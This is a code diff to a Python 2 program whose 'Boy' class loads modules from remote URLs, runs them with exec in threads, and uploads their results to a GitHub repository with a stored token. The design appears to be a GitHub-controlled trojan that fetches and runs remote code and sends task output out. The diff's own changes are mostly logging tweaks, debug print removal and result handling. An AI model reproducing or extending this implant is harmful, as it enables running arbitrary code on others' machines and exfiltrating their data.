@@ -12,17 +12,15 @@ import threading
 # except ImportError:
 #     from urllib.request import urlopen
 import logging
-log_FORMAT = "%(message)s"
+# log_FORMAT = '%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
+log_FORMAT = '[%(asctime)s] [%(levelname)s] [ %(filename)s:%(lineno)s - %(name)s ] %(message)s '
 logging.basicConfig(format=log_FORMAT)
 logger = logging.getLogger(__name__)
 # logger.setLevel(logging.WARN)
-logger.setLevel(logging.DEBUG)
+logger.setLevel(logging.INFO)
 
 from httpimp import add_remote_repo, remove_remote_repo
 from toy.modules import gh
-print sys.path
-for i in sys.modules:
-    print i
 
 
 class Boy(object):
@@ -69,7 +67,7 @@ class Boy(object):
     @staticmethod
     def load(module, url):
         try:
-            logging.debug('Try to import module')
+            logging.info('Try to import module')
             add_remote_repo([module], url)
             exec "import %s" % module
         except Exception:
@@ -86,7 +84,8 @@ class Boy(object):
         for url, pkgs in self.base_modules.items():
             if not isinstance(pkgs, (list, tuple)):
                 pkgs = [pkgs]
-            self.load(pkgs, url)
+            for p in pkgs:
+                self.load([p], url)
         for pkg in self.run_modules:
             self.load_module(pkg['module'])
         self.init = False
@@ -132,7 +131,7 @@ class Boy(object):
     @staticmethod
     def load_module(mod, pkg='toy.modules'):
         try:
-            logging.debug('Import %s from %s' % (mod, pkg))
+            logging.info('Import %s from %s' % (mod, pkg))
             exec "from %s import %s" % (pkg, mod)
         except Exception:
             logging.error("Import %s error" % '.'.join((pkg, mod)))
@@ -160,9 +159,12 @@ class Boy(object):
         path = self.result_path + '%d.data' % random.randint(
             1000, 100000)
         self.task_queue.put(1)
-        result = sys.modules[m].run()
+        print sys.modules[m]
+        result = sys.modules[m].run() or 'Err'
         self.task_queue.get()
-        gh.put(self.guser, self.gtoken, self.grepo, path, result)
+        if result:
+            logger.info('[*] Get result: %s' % result)
+            gh.put(self.guser, self.gtoken, self.grepo, path, result)
         if not loop:
             del sys.modules[m]
         return
@@ -174,7 +176,7 @@ class Boy(object):
                 if not self.init:
                     self.check()
                 for task in self.run_modules:
-                    logging.debug("run task %s" % task['module'])
+                    logging.info("run task %s" % task['module'])
                     mod = 'toy.modules.%s' % task['module']
                     try:
                         t = threading.Thread(
